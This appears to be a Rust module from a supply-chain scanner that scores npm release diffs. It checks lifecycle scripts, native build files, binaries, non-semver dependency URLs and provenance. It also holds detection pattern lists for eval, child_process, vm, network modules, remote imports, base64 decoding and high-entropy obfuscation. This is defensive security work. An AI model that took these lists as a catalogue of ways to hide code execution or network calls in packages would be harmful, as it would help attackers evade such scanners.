use crate::advisory::AdvisoryReport;
use crate::diff::{Delta, FileKind};
use crate::policy::Policy;
use crate::provenance::{ProvenanceReport, ProvenanceStatus};
use crate::verdict::{DiffSummary, Finding, TrustSources, Verdict, VerdictBand};

#[allow(dead_code)]
pub fn evaluate(
    name: &str,
    integrity: &str,
    delta: &Delta,
    is_unreviewed_baseline: bool,
) -> Verdict {
    evaluate_with_policy(
        name,
        integrity,
        delta,
        is_unreviewed_baseline,
        &Policy::default(),
    )
}

pub fn evaluate_with_policy(
    name: &str,
    integrity: &str,
    delta: &Delta,
    is_unreviewed_baseline: bool,
    policy: &Policy,
) -> Verdict {
    evaluate_with_trust(
        name,
        integrity,
        delta,
        is_unreviewed_baseline,
        policy,
        None,
        None,
    )
}

pub fn evaluate_with_trust(
    name: &str,
    integrity: &str,
    delta: &Delta,
    is_unreviewed_baseline: bool,
    policy: &Policy,
    advisories: Option<&AdvisoryReport>,
    provenance: Option<&ProvenanceReport>,
) -> Verdict {
    let mut findings = Vec::new();

    // P01: Check if package is explicitly blocked by policy
    if policy.is_package_blocked(name) {
        findings.push(Finding {
            rule_id: "P01_PACKAGE_BLOCKED".into(),
            severity: VerdictBand::Block,
            title: format!("Package `{name}` is blocked by policy"),
            description: "The package matches an active blocklist rule in blueline.toml.".into(),
        });
    }

    // Advisory Findings (Phase 2)
    if let Some(adv_rep) = advisories {
        for hit in &adv_rep.hits {
            if hit.is_malware {
                findings.push(Finding {
                    rule_id: "R09_ADVISORY_MALWARE".into(),
                    severity: VerdictBand::Block,
                    title: format!("Known malware advisory: {}", hit.id),
                    description: hit.summary.clone(),
                });
            } else if hit.severity == VerdictBand::Block {
                findings.push(Finding {
                    rule_id: "R09_ADVISORY_CRITICAL_CVE".into(),
                    severity: VerdictBand::Block,
                    title: format!("Critical vulnerability: {}", hit.id),
                    description: hit.summary.clone(),
                });
            } else {
                findings.push(Finding {
                    rule_id: "R09_ADVISORY_CVE".into(),
                    severity: hit.severity,
                    title: format!("Known vulnerability ({}): {}", hit.severity, hit.id),
                    description: hit.summary.clone(),
                });
            }
        }
    }

    // Provenance Findings (Phase 2)
    if let Some(prov_rep) = provenance {
        if prov_rep.status == ProvenanceStatus::FailedMismatch {
            findings.push(Finding {
                rule_id: "P03_PROVENANCE_DIGEST_MISMATCH".into(),
                severity: VerdictBand::Block,
                title: "Provenance digest mismatch".into(),
                description: prov_rep.message.clone().unwrap_or_else(|| {
                    "Tarball SHA512 does not match in-toto attestation subject digest".into()
                }),
            });
        }

        if (policy.policy.require_provenance || policy.provenance.require_provenance)
            && prov_rep.status != ProvenanceStatus::Verified
        {
            findings.push(Finding {
                rule_id: "P03_PROVENANCE_REQUIRED_MISSING".into(),
                severity: VerdictBand::Block,
                title: "Required build provenance missing".into(),
                description:
                    "Policy requires verified SLSA build provenance, but none was present.".into(),
            });
        }

        if policy.provenance.require_signatures && !prov_rep.registry_signature_present {
            findings.push(Finding {
                rule_id: "P03_SIGNATURE_REQUIRED_MISSING".into(),
                severity: VerdictBand::Block,
                title: "Required registry signature missing".into(),
                description:
                    "Policy requires npm registry signatures, but no valid signature was attached."
                        .into(),
            });
        }

        if !policy.provenance.allowed_repositories.is_empty()
            && let Some(ref repo) = prov_rep.source_repo
        {
            let allowed = policy
                .provenance
                .allowed_repositories
                .iter()
                .any(|a| is_repo_allowed(repo, a));
            if !allowed {
                findings.push(Finding {
                    rule_id: "P03_UNAUTHORIZED_BUILD_REPO".into(),
                    severity: VerdictBand::Block,
                    title: format!("Unauthorized source repository `{repo}`"),
                    description:
                        "The build provenance repository is not in the allowed repositories list."
                            .into(),
                });
            }
        }
    }

    // R01: Lifecycle scripts
    for script in &delta.new_lifecycle_scripts {
        if policy.is_script_allowed(name, script) {
            findings.push(Finding {
                rule_id: "P02_LIFECYCLE_SCRIPT_ALLOWED".into(),
                severity: VerdictBand::Low,
                title: format!("Allowed lifecycle script: `{script}`"),
                description: format!(
                    "The lifecycle script `{script}` is explicitly allowed by policy allowlist."
                ),
            });
        } else {
            findings.push(Finding {
                rule_id: "R01_LIFECYCLE_SCRIPT_ADDED".into(),
                severity: if policy.policy.block_unreviewed_scripts {
                    VerdictBand::Block
                } else {
                    VerdictBand::High
                },
                title: format!("New install-time lifecycle script: `{script}`"),
                description: format!(
                    "The package added `{script}` to package.json scripts which executes automatically on install."
                ),
            });
        }
    }

    for script in &delta.modified_lifecycle_scripts {
        if policy.is_script_allowed(name, script) {
            findings.push(Finding {
                rule_id: "P02_LIFECYCLE_SCRIPT_ALLOWED".into(),
                severity: VerdictBand::Low,
                title: format!("Allowed modified lifecycle script: `{script}`"),
                description: format!(
                    "The modified lifecycle script `{script}` is explicitly allowed by policy allowlist."
                ),
            });
        } else {
            findings.push(Finding {
                rule_id: "R01_LIFECYCLE_SCRIPT_MODIFIED".into(),
                severity: VerdictBand::High,
                title: format!("Modified lifecycle script: `{script}`"),
                description: format!(
                    "The command for lifecycle script `{script}` was modified between releases."
                ),
            });
        }
    }

    // Native build trigger: binding.gyp in root triggers node-gyp rebuild on install
    let binding_allowed =
        policy.is_script_allowed(name, "binding.gyp") || policy.is_script_allowed(name, "node-gyp");
    if delta.binding_gyp_added
        || delta
            .files_added
            .iter()
            .any(|f| f.relative_path == "binding.gyp")
    {
        findings.push(Finding {
            rule_id: if binding_allowed {
                "P02_BINDING_GYP_ALLOWED".into()
            } else {
                "R01_BINDING_GYP_ADDED".into()
            },
            severity: if binding_allowed {
                VerdictBand::Low
            } else {
                VerdictBand::Block
            },
            title: if binding_allowed {
                "Allowed native build trigger: `binding.gyp`".into()
            } else {
                "Automated native build trigger: `binding.gyp`".into()
            },
            description: "The package added `binding.gyp` in root which triggers `node-gyp rebuild` automatically on install.".into(),
        });
    } else if delta
        .files_modified
        .iter()
        .any(|f| f.relative_path == "binding.gyp")
    {
        findings.push(Finding {
            rule_id: if binding_allowed {
                "P02_BINDING_GYP_ALLOWED".into()
            } else {
                "R01_BINDING_GYP_MODIFIED".into()
            },
            severity: if binding_allowed {
                VerdictBand::Low
            } else {
                VerdictBand::High
            },
            title: if binding_allowed {
                "Allowed native build file: `binding.gyp`".into()
            } else {
                "Modified native build file: `binding.gyp`".into()
            },
            description: "The `binding.gyp` native build configuration was modified between releases.".into(),
        });
    }

    // R02: Native executables or binaries
    for exe in &delta.new_executables {
        findings.push(Finding {
            rule_id: "R02_EXECUTABLE_ADDED".into(),
            severity: VerdictBand::High,
            title: format!("Executable or script added: `{exe}`"),
            description: format!(
                "File `{exe}` has an executable extension or executable filesystem permissions."
            ),
        });
    }

    // R02: Opaque oversized files added/modified
    for file in &delta.files_added {
        if file.kind == FileKind::OpaqueTooLarge {
            findings.push(Finding {
                rule_id: "R02_OPAQUE_LARGE_FILE_ADDED".into(),
                severity: VerdictBand::High,
                title: format!("Opaque oversized file added: `{}`", file.relative_path),
                description: format!(
                    "File `{}` exceeds the diff inspection cap and cannot be inspected as text.",
                    file.relative_path
                ),
            });
        }
    }
    for file in &delta.files_modified {
        if file.kind == FileKind::OpaqueTooLarge {
            findings.push(Finding {
                rule_id: "R02_OPAQUE_LARGE_FILE_ADDED".into(),
                severity: VerdictBand::High,
                title: format!("Opaque oversized file modified: `{}`", file.relative_path),
                description: format!(
                    "File `{}` exceeds the diff inspection cap and cannot be inspected as text.",
                    file.relative_path
                ),
            });
        }
    }

    for bin in &delta.new_binaries {
        if !delta.new_executables.contains(bin) {
            let is_opaque_large = delta
                .files_added
                .iter()
                .chain(delta.files_modified.iter())
                .any(|f| &f.relative_path == bin && f.kind == FileKind::OpaqueTooLarge);
            if !is_opaque_large {
                findings.push(Finding {
                    rule_id: "R02_BINARY_BLOB_ADDED".into(),
                    severity: VerdictBand::High,
                    title: format!("Binary or opaque blob added: `{bin}`"),
                    description: format!(
                        "File `{bin}` contains NUL bytes or non-UTF-8 content and cannot be inspected as text."
                    ),
                });
            }
        }
    }

    for bin in &delta.modified_binaries {
        findings.push(Finding {
            rule_id: "R02_BINARY_BLOB_MODIFIED".into(),
            severity: VerdictBand::High,
            title: format!("Binary or opaque blob modified: `{bin}`"),
            description: format!(
                "Pre-existing binary file `{bin}` was modified or replaced between releases."
            ),
        });
    }

    // R03: Suspicious code in text diffs (eval, child_process, base64 payload)
    for file in delta.files_added.iter().chain(delta.files_modified.iter()) {
        if file.kind == FileKind::Text
            && let Some(diff_text) = &file.unified_diff
        {
            scan_diff_for_suspicious_patterns(&file.relative_path, diff_text, &mut findings);
        }
    }

    // R04: Dependency changes
    if !delta.new_dependencies.is_empty() {
        let deps_str = delta
            .new_dependencies
            .iter()
            .map(|(d, v)| format!("{d}@{v}"))
            .collect::<Vec<_>>()
            .join(", ");
        let has_suspicious_url = delta
            .new_dependencies
            .iter()
            .any(|(_, v)| is_non_semver_url(v));

        findings.push(Finding {
            rule_id: "R04_DEPENDENCY_ADDED".into(),
            severity: if has_suspicious_url {
                VerdictBand::High
            } else {
                VerdictBand::Medium
            },
            title: format!(
                "{} new runtime dependencies added",
                delta.new_dependencies.len()
            ),
            description: format!("Added dependencies: {deps_str}"),
        });
    }

    for (dep, old_ver, new_ver) in &delta.modified_dependencies {
        if is_non_semver_url(new_ver) {
            findings.push(Finding {
                rule_id: "R04_DEPENDENCY_MODIFIED".into(),
                severity: VerdictBand::High,
                title: format!("Dependency `{dep}` changed to non-semver URL"),
                description: format!(
                    "Dependency `{dep}` version modified from `{old_ver}` to suspicious URL `{new_ver}`."
                ),
            });
        }
    }

    // R05: Large diff anomaly on patch or non-standard semver
    if let Some(base_ver_str) = &delta.baseline_version {
        match (
            semver::Version::parse(base_ver_str),
            semver::Version::parse(&delta.target_version),
        ) {
            (Ok(base_v), Ok(target_v)) => {
                if base_v.major == target_v.major
                    && base_v.minor == target_v.minor
                    && delta.total_lines_added > 500
                {
                    findings.push(Finding {
                        rule_id: "R05_LARGE_PATCH_DIFF".into(),
                        severity: VerdictBand::Medium,
                        title: format!("Large patch delta (+{} lines)", delta.total_lines_added),
                        description: format!(
                            "Patch release {base_v} -> {target_v} added {} lines across {} files.",
                            delta.total_lines_added,
                            delta.files_added.len() + delta.files_modified.len()
                        ),
                    });
                }
            }
            _ => {
                findings.push(Finding {
                    rule_id: "R05_NON_STANDARD_VERSION".into(),
                    severity: VerdictBand::Medium,
                    title: "Non-standard version format".into(),
                    description: format!(
                        "Baseline `{base_ver_str}` or target `{}` does not conform to strict semver.",
                        delta.target_version
                    ),
                });
            }
        }
    }

    // R06: First sighting
    if delta.baseline_version.is_none() {
        findings.push(Finding {
            rule_id: "R06_FIRST_SIGHTING".into(),
            severity: VerdictBand::Medium,
            title: "First sighting: no known-clean baseline exists".into(),
            description: "No previous version was found to diff against; full tarball inspected."
                .into(),
        });
    }

    // R07: Unreviewed predecessor baseline
    if is_unreviewed_baseline {
        let base_ver = delta.baseline_version.as_deref().unwrap_or("unknown");
        findings.push(Finding {
            rule_id: "R07_UNREVIEWED_PREDECESSOR_BASELINE".into(),
            severity: VerdictBand::Medium,
            title: format!("Unreviewed baseline version `{base_ver}`"),
            description: format!(
                "Baseline version `{base_ver}` was selected from registry history and has not been approved locally."
            ),
        });
    }

    let mut score: u32 = 0;
    let mut band = VerdictBand::Low;

    for f in &findings {
        match f.severity {
            VerdictBand::Block => {
                score = score.saturating_add(50);
                band = VerdictBand::Block;
            }
            VerdictBand::High => {
                score = score.saturating_add(25);
                if band < VerdictBand::High {
                    band = VerdictBand::High;
                }
            }
            VerdictBand::Medium => {
                let add = if f.rule_id == "R06_FIRST_SIGHTING" {
                    15
                } else {
                    10
                };
                score = score.saturating_add(add);
                if band < VerdictBand::Medium {
                    band = VerdictBand::Medium;
                }
            }
            VerdictBand::Low => {}
        }
    }

    let capped_score = score.min(100);

    // Escalate according to policy thresholds if accumulated score exceeds them
    if capped_score >= policy.thresholds.block_score {
        band = VerdictBand::Block;
    } else if capped_score > policy.thresholds.max_medium_score && band < VerdictBand::High {
        band = VerdictBand::High;
    } else if capped_score > policy.thresholds.max_low_score && band < VerdictBand::Medium {
        band = VerdictBand::Medium;
    }

    Verdict {
        name: name.to_string(),
        target_version: delta.target_version.clone(),
        baseline_version: delta.baseline_version.clone(),
        integrity: integrity.to_string(),
        band,
        risk_score: capped_score,
        findings,
        diff_summary: DiffSummary {
            files_added: delta.files_added.len(),
            files_removed: delta.files_removed.len(),
            files_modified: delta.files_modified.len(),
            lines_added: delta.total_lines_added,
            lines_deleted: delta.total_lines_deleted,
        },
        trust_sources: if advisories.is_some() || provenance.is_some() {
            Some(TrustSources {
                advisories: advisories.cloned(),
                provenance: provenance.cloned(),
            })
        } else {
            None
        },
    }
}

fn is_non_semver_url(v: &str) -> bool {
    let lower = v.to_lowercase();
    lower.starts_with("git")
        || lower.starts_with("http://")
        || lower.starts_with("https://")
        || lower.starts_with("github:")
        || lower.starts_with("gitlab:")
        || lower.starts_with("bitbucket:")
        || lower.starts_with("ssh://")
        || lower.starts_with("file:")
        || lower.starts_with("link:")
        || lower.starts_with("npm:")
}

fn scan_diff_for_suspicious_patterns(path: &str, diff: &str, findings: &mut Vec<Finding>) {
    let mut added_lines = Vec::new();
    for line in diff.lines() {
        if line.starts_with('+') && !line.starts_with("+++ ") && !line.starts_with("+++ b/") {
            added_lines.push(&line[1..]);
        }
    }
    if added_lines.is_empty() {
        return;
    }

    let combined_added = added_lines.join("\n");
    let unescaped = unescape_js(&combined_added);
    let s_clean = strip_comments_and_whitespace(&unescaped);
    let s_clean_lower = s_clean.to_ascii_lowercase();

    if has_eval_invocation(&s_clean) {
        findings.push(Finding {
            rule_id: "R03_EVAL_USAGE".into(),
            severity: VerdictBand::High,
            title: format!("Dynamic code evaluation in `{path}`"),
            description: format!("Diff introduced `eval()` or `new Function()` in `{path}`."),
        });
    }

    if has_child_proc_invocation(&s_clean) {
        findings.push(Finding {
            rule_id: "R03_CHILD_PROCESS".into(),
            severity: VerdictBand::High,
            title: format!("Process execution primitive in `{path}`"),
            description: format!("Diff introduced child_process execution calls in `{path}`."),
        });
    }

    if has_vm_invocation(&s_clean) {
        findings.push(Finding {
            rule_id: "R03_VM_EXECUTION".into(),
            severity: VerdictBand::High,
            title: format!("Dynamic VM code execution in `{path}`"),
            description: format!("Diff introduced Node.js `vm` module execution in `{path}`."),
        });
    }

    if has_network_invocation(&s_clean) {
        findings.push(Finding {
            rule_id: "R03_NETWORK_PRIMITIVE".into(),
            severity: VerdictBand::Medium,
            title: format!("Network request primitive in `{path}`"),
            description: format!(
                "Diff introduced outbound network communication calls in `{path}`."
            ),
        });
    }

    if has_base64_decode(&s_clean_lower) {
        findings.push(Finding {
            rule_id: "R03_BASE64_DECODE".into(),
            severity: VerdictBand::Medium,
            title: format!("Base64 decoding in `{path}`"),
            description: format!("Diff introduced base64 decode calls in `{path}`."),
        });
    }

    for line in added_lines {
        if is_suspicious_high_entropy(line) {
            findings.push(Finding {
                rule_id: "R03_HIGH_ENTROPY".into(),
                severity: VerdictBand::High,
                title: format!("High-entropy obfuscated token in `{path}`"),
                description: format!(
                    "Diff introduced high-entropy obfuscated string/payload in `{path}`."
                ),
            });
            break;
        }
    }
}

fn unescape_js(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.peek() {
                Some('x') => {
                    chars.next();
                    let mut hex = String::new();
                    for _ in 0..2 {
                        if let Some(&h) = chars.peek()
                            && h.is_ascii_hexdigit()
                            && let Some(ch) = chars.next()
                        {
                            hex.push(ch);
                        }
                    }
                    if hex.len() == 2
                        && let Ok(val) = u8::from_str_radix(&hex, 16)
                    {
                        out.push(val as char);
                    } else {
                        out.push('\\');
                        out.push('x');
                        out.push_str(&hex);
                    }
                }
                Some('u') => {
                    chars.next();
                    if chars.peek() == Some(&'{') {
                        chars.next();
                        let mut hex = String::new();
                        while let Some(&h) = chars.peek() {
                            if h == '}' {
                                chars.next();
                                break;
                            }
                            if h.is_ascii_hexdigit()
                                && let Some(ch) = chars.next()
                            {
                                hex.push(ch);
                            } else {
                                break;
                            }
                        }
                        if let Ok(code) = u32::from_str_radix(&hex, 16)
                            && let Some(ch) = char::from_u32(code)
                        {
                            out.push(ch);
                        } else {
                            out.push('\\');
                            out.push('u');
                            out.push('{');
                            out.push_str(&hex);
                            out.push('}');
                        }
                    } else {
                        let mut hex = String::new();
                        for _ in 0..4 {
                            if let Some(&h) = chars.peek()
                                && h.is_ascii_hexdigit()
                                && let Some(ch) = chars.next()
                            {
                                hex.push(ch);
                            }
                        }
                        if hex.len() == 4
                            && let Ok(code) = u32::from_str_radix(&hex, 16)
                            && let Some(ch) = char::from_u32(code)
                        {
                            out.push(ch);
                        } else {
                            out.push('\\');
                            out.push('u');
                            out.push_str(&hex);
                        }
                    }
                }
                Some(&d) if ('0'..='7').contains(&d) => {
                    // Octal escape sequence (e.g. \145 \166 \141 \154)
                    let mut oct = String::new();
                    if let Some(first) = chars.next() {
                        oct.push(first);
                    }
                    for _ in 0..2 {
                        if let Some(&o) = chars.peek()
                            && ('0'..='7').contains(&o)
                            && let Some(ch) = chars.next()
                        {
                            oct.push(ch);
                        } else {
                            break;
                        }
                    }
                    if let Ok(val) = u8::from_str_radix(&oct, 8) {
                        out.push(val as char);
                    } else {
                        out.push('\\');
                        out.push_str(&oct);
                    }
                }
                _ => {
                    out.push(c);
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

fn strip_comments_and_whitespace(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    let mut in_quote: Option<char> = None;
    while let Some(c) = chars.next() {
        if let Some(q) = in_quote {
            if c == '\\' {
                out.push(c);
                if let Some(escaped) = chars.next() {
                    out.push(escaped);
                }
                continue;
            }
            if c == q {
                in_quote = None;
            }
            if !c.is_whitespace() {
                out.push(c);
            }
            continue;
        }

        if c == '?' && chars.peek() == Some(&'.') {
            chars.next();
            if chars.peek() == Some(&'(') {
                continue;
            } else {
                out.push('.');
                continue;
            }
        }

        if c == '"' || c == '\'' || c == '`' {
            in_quote = Some(c);
            out.push(c);
            continue;
        }

        if c == '/' {
            if let Some(&'*') = chars.peek() {
                chars.next();
                while let Some(ch) = chars.next() {
                    if ch == '*' && chars.peek() == Some(&'/') {
                        chars.next();
                        break;
                    }
                }
                continue;
            } else if let Some(&'/') = chars.peek() {
                chars.next();
                for ch in chars.by_ref() {
                    if ch == '\n' {
                        break;
                    }
                }
                continue;
            }
        }
        if !c.is_whitespace() {
            out.push(c);
        }
    }
    out
}

fn has_vm_invocation(s_clean: &str) -> bool {
    s_clean.contains("vm.runInThisContext")
        || s_clean.contains("vm.runInNewContext")
        || s_clean.contains("vm.runInContext")
        || s_clean.contains("vm.compileFunction")
        || s_clean.contains("compileFunction(")
        || s_clean.contains("vm.Script(")
        || s_clean.contains("vm.createScript(")
        || s_clean.contains("runInThisContext(")
        || s_clean.contains("runInNewContext(")
}

#[cfg(test)]
fn is_vm_invocation(s: &str) -> bool {
    let unescaped = unescape_js(s);
    let s_clean = strip_comments_and_whitespace(&unescaped);
    has_vm_invocation(&s_clean)
}

fn contains_call(s: &str, target: &str) -> bool {
    let mut search_idx = 0;
    while let Some(found) = s[search_idx..].find(target) {
        let actual_idx = search_idx + found;
        let is_start = actual_idx == 0;
        let prev_is_ident = if is_start {
            false
        } else {
            let prev_char = s[..actual_idx].chars().next_back().unwrap_or(' ');
            prev_char.is_ascii_alphanumeric() || prev_char == '_' || prev_char == '$'
        };

        if !prev_is_ident {
            return true;
        }
        search_idx = actual_idx + target.len();
    }
    false
}

fn has_network_invocation(s_clean: &str) -> bool {
    contains_call(s_clean, "fetch(")
        || contains_call(s_clean, "fetch`")
        || contains_call(s_clean, "WebSocket(")
        || s_clean.contains("http.request(")
        || s_clean.contains("http.get(")
        || s_clean.contains("https.request(")
        || s_clean.contains("https.get(")
        || s_clean.contains("net.connect(")
        || s_clean.contains("tls.connect(")
        || s_clean.contains("dgram.createSocket(")
        || s_clean.contains("http2.connect(")
        || s_clean.contains("http2.createSecureServer(")
        || s_clean.contains("http2.createServer(")
        || s_clean.contains("dns.resolve(")
        || s_clean.contains("dns.resolve4(")
        || s_clean.contains("dns.resolve6(")
        || s_clean.contains("dns.resolveTxt(")
        || s_clean.contains("dns.lookup(")
        || s_clean.contains("dns.promises")
        || s_clean.contains("require('http')")
        || s_clean.contains("require(\"http\")")
        || s_clean.contains("require(`http`)")
        || s_clean.contains("require('https')")
        || s_clean.contains("require(\"https\")")
        || s_clean.contains("require(`https`)")
        || s_clean.contains("require('net')")
        || s_clean.contains("require(\"net\")")
        || s_clean.contains("require(`net`)")
        || s_clean.contains("require('tls')")
        || s_clean.contains("require(\"tls\")")
        || s_clean.contains("require(`tls`)")
        || s_clean.contains("require('dgram')")
        || s_clean.contains("require(\"dgram\")")
        || s_clean.contains("require(`dgram`)")
        || s_clean.contains("require('http2')")
        || s_clean.contains("require(\"http2\")")
        || s_clean.contains("require(`http2`)")
        || s_clean.contains("require('dns')")
        || s_clean.contains("require(\"dns\")")
        || s_clean.contains("require(`dns`)")
        || s_clean.contains("require('undici')")
        || s_clean.contains("require(\"undici\")")
        || s_clean.contains("require(`undici`)")
        || s_clean.contains("require('axios')")
        || s_clean.contains("require(\"axios\")")
        || s_clean.contains("require(`axios`)")
        || s_clean.contains("require('node:http')")
        || s_clean.contains("require(\"node:http\")")
        || s_clean.contains("require(`node:http`)")
        || s_clean.contains("require('node:https')")
        || s_clean.contains("require(\"node:https\")")
        || s_clean.contains("require(`node:https`)")
        || s_clean.contains("require('node:net')")
        || s_clean.contains("require(\"node:net\")")
        || s_clean.contains("require(`node:net`)")
        || s_clean.contains("require('node:tls')")
        || s_clean.contains("require(\"node:tls\")")
        || s_clean.contains("require(`node:tls`)")
        || s_clean.contains("require('node:dgram')")
        || s_clean.contains("require(\"node:dgram\")")
        || s_clean.contains("require(`node:dgram`)")
        || s_clean.contains("require('node:http2')")
        || s_clean.contains("require(\"node:http2\")")
        || s_clean.contains("require(`node:http2`)")
        || s_clean.contains("require('node:dns')")
        || s_clean.contains("require(\"node:dns\")")
        || s_clean.contains("require(`node:dns`)")
        || s_clean.contains("import('http')")
        || s_clean.contains("import(\"http\")")
        || s_clean.contains("import(`http`)")
        || s_clean.contains("import('https')")
        || s_clean.contains("import(\"https\")")
        || s_clean.contains("import(`https`)")
        || s_clean.contains("import('net')")
        || s_clean.contains("import(\"net\")")
        || s_clean.contains("import(`net`)")
        || s_clean.contains("import('tls')")
        || s_clean.contains("import(\"tls\")")
        || s_clean.contains("import(`tls`)")
        || s_clean.contains("import('dgram')")
        || s_clean.contains("import(\"dgram\")")
        || s_clean.contains("import(`dgram`)")
        || s_clean.contains("import('http2')")
        || s_clean.contains("import(\"http2\")")
        || s_clean.contains("import(`http2`)")
        || s_clean.contains("import('dns')")
        || s_clean.contains("import(\"dns\")")
        || s_clean.contains("import(`dns`)")
        || s_clean.contains("import('undici')")
        || s_clean.contains("import(\"undici\")")
        || s_clean.contains("import(`undici`)")
        || s_clean.contains("import('axios')")
        || s_clean.contains("import(\"axios\")")
        || s_clean.contains("import(`axios`)")
        || s_clean.contains("import('node:http')")
        || s_clean.contains("import(\"node:http\")")
        || s_clean.contains("import(`node:http`)")
        || s_clean.contains("import('node:https')")
        || s_clean.contains("import(\"node:https\")")
        || s_clean.contains("import(`node:https`)")
        || s_clean.contains("import('node:net')")
        || s_clean.contains("import(\"node:net\")")
        || s_clean.contains("import(`node:net`)")
        || s_clean.contains("import('node:tls')")
        || s_clean.contains("import(\"node:tls\")")
        || s_clean.contains("import(`node:tls`)")
        || s_clean.contains("import('node:dgram')")
        || s_clean.contains("import(\"node:dgram\")")
        || s_clean.contains("import(`node:dgram`)")
        || s_clean.contains("import('node:http2')")
        || s_clean.contains("import(\"node:http2\")")
        || s_clean.contains("import(`node:http2`)")
        || s_clean.contains("import('node:dns')")
        || s_clean.contains("import(\"node:dns\")")
        || s_clean.contains("import(`node:dns`)")
}

#[cfg(test)]
fn is_network_invocation(s: &str) -> bool {
    let unescaped = unescape_js(s);
    let s_clean = strip_comments_and_whitespace(&unescaped);
    has_network_invocation(&s_clean)
}

fn has_eval_invocation(s_clean: &str) -> bool {
    contains_call(s_clean, "eval(")
        || contains_call(s_clean, "eval`")
        || s_clean.contains("(eval)(")
        || s_clean.contains(",eval)")
        || s_clean.contains(",eval;")
        || s_clean.contains("eval)(")
        || s_clean.contains("eval.call(")
        || s_clean.contains("eval.apply(")
        || s_clean.contains("eval.bind(")
        || s_clean.contains("Function.call(")
        || s_clean.contains("Function.apply(")
        || s_clean.contains("Function.bind(")
        || contains_call(s_clean, "Function(")
        || contains_call(s_clean, "Function`")
        || s_clean.contains("newFunction(")
        || s_clean.contains("newFunction`")
        || s_clean.contains("(Function)(")
        || s_clean.contains("(Function)`")
        || s_clean.contains("(Function).call(")
        || s_clean.contains("(Function).apply(")
        || contains_call(s_clean, "AsyncFunction(")
        || contains_call(s_clean, "AsyncFunction`")
        || contains_call(s_clean, "GeneratorFunction(")
        || contains_call(s_clean, "GeneratorFunction`")
        || contains_call(s_clean, "AsyncGeneratorFunction(")
        || contains_call(s_clean, "AsyncGeneratorFunction`")
        || s_clean.contains(".constructor(")
        || s_clean.contains("['constructor'](")
        || s_clean.contains("[\"constructor\"](")
        || s_clean.contains("[`constructor`]")
        || s_clean.contains("Reflect.construct(")
        || s_clean.contains("Reflect.apply(")
        || s_clean.contains("Reflect.get(")
        || s_clean.contains("Reflect.has(")
        || contains_call(s_clean, "String.fromCharCode(")
        || contains_call(s_clean, "String.fromCodePoint(")
        || contains_call(s_clean, "fromCharCode(")
        || contains_call(s_clean, "fromCodePoint(")
        || s_clean.contains("globalThis[")
        || s_clean.contains("window[")
        || s_clean.contains("global[")
        || s_clean.contains("globalThis.eval")
        || s_clean.contains("window.eval")
        || s_clean.contains("global.eval")
        || s_clean.contains("globalThis[\"eval\"]")
        || s_clean.contains("globalThis['eval']")
        || s_clean.contains("globalThis[`eval`]")
        || s_clean.contains("window[\"eval\"]")
        || s_clean.contains("window['eval']")
        || s_clean.contains("window[`eval`]")
        || s_clean.contains("global[\"eval\"]")
        || s_clean.contains("global['eval']")
        || s_clean.contains("global[`eval`]")
        || s_clean.contains("this[\"eval\"]")
        || s_clean.contains("this['eval']")
        || s_clean.contains("this[`eval`]")
        || s_clean.contains("import(\"data:")
        || s_clean.contains("import('data:")
        || s_clean.contains("import(`data:")
        || s_clean.contains("import(\"http://")
        || s_clean.contains("import('http://")
        || s_clean.contains("import(`http://")
        || s_clean.contains("import(\"https://")
        || s_clean.contains("import('https://")
        || s_clean.contains("import(`https://")
}

#[cfg(test)]
fn is_eval_invocation(s: &str) -> bool {
    let unescaped = unescape_js(s);
    let s_clean = strip_comments_and_whitespace(&unescaped);
    has_eval_invocation(&s_clean)
}

fn has_child_proc_invocation(s_clean: &str) -> bool {
    s_clean.contains("child_process")
        || s_clean.contains("node:child_process")
        || s_clean.contains("worker_threads")
        || s_clean.contains("node:worker_threads")
        || s_clean.contains("newWorker(")
        || s_clean.contains("newWorker`")
        || contains_call(s_clean, "Worker(")
        || contains_call(s_clean, "Worker`")
        || contains_call(s_clean, "execSync(")
        || contains_call(s_clean, "spawnSync(")
        || contains_call(s_clean, "execFileSync(")
        || contains_call(s_clean, "execFile(")
        || contains_call(s_clean, "spawn(")
        || contains_call(s_clean, "fork(")
        || s_clean.contains("process.binding('spawn_sync')")
        || s_clean.contains("process.binding(\"spawn_sync\")")
        || s_clean.contains("process._linkedBinding")
        || s_clean.contains("process.getBuiltinModule")
}

#[cfg(test)]
fn is_child_proc_invocation(s: &str) -> bool {
    let unescaped = unescape_js(s);
    let s_clean = strip_comments_and_whitespace(&unescaped);
    has_child_proc_invocation(&s_clean)
}

fn has_base64_decode(s_clean_lower: &str) -> bool {
    (s_clean_lower.contains("buffer.from(")
        && (s_clean_lower.contains("'base64'")
            || s_clean_lower.contains("\"base64\"")
            || s_clean_lower.contains("`base64`")
            || s_clean_lower.contains("'base64url'")
            || s_clean_lower.contains("\"base64url\"")
            || s_clean_lower.contains("`base64url`")
            || s_clean_lower.contains("'hex'")
            || s_clean_lower.contains("\"hex\"")
            || s_clean_lower.contains("`hex`")))
        || s_clean_lower.contains("atob(")
        || s_clean_lower.contains("btoa(")
}

#[cfg(test)]
fn is_base64_decode(s: &str) -> bool {
    let unescaped = unescape_js(s);
    let s_clean_lower = strip_comments_and_whitespace(&unescaped).to_ascii_lowercase();
    has_base64_decode(&s_clean_lower)
}

fn is_suspicious_high_entropy(line: &str) -> bool {
    // Only check long tokens (> 64 chars) without whitespace
    for token in line.split_whitespace() {
        if token.len() >= 64 {
            let entropy = shannon_entropy(token);
            if entropy > 5.5 {
                return true;
            }
        }
    }
    false
}

fn shannon_entropy(s: &str) -> f64 {
    let mut counts = [0u32; 256];
    let mut total = 0u32;
    for b in s.bytes() {
        counts[b as usize] += 1;
        total += 1;
    }
    if total == 0 {
        return 0.0;
    }
    let total_f = total as f64;
    let mut entropy = 0.0;
    for &c in &counts {
        if c > 0 {
            let p = c as f64 / total_f;
            entropy -= p * p.log2();
        }
    }
    entropy
}

fn normalize_repo_uri(mut s: &str) -> &str {
    s = s.trim();
    for prefix in &[
        "git+https://",
        "git+http://",
        "git+ssh://",
        "https://",
        "http://",
        "ssh://",
        "git://",
    ] {
        if let Some(rest) = s.strip_prefix(prefix) {
            s = rest;
            break;
        }
    }
    if let Some(rest) = s.strip_prefix("git@") {
        s = rest;
    }
    if let Some(idx) = s.find('@') {
        s = &s[..idx];
    }
    if let Some(rest) = s.strip_suffix(".git") {
        s = rest;
    }
    s.trim_end_matches('/')
}

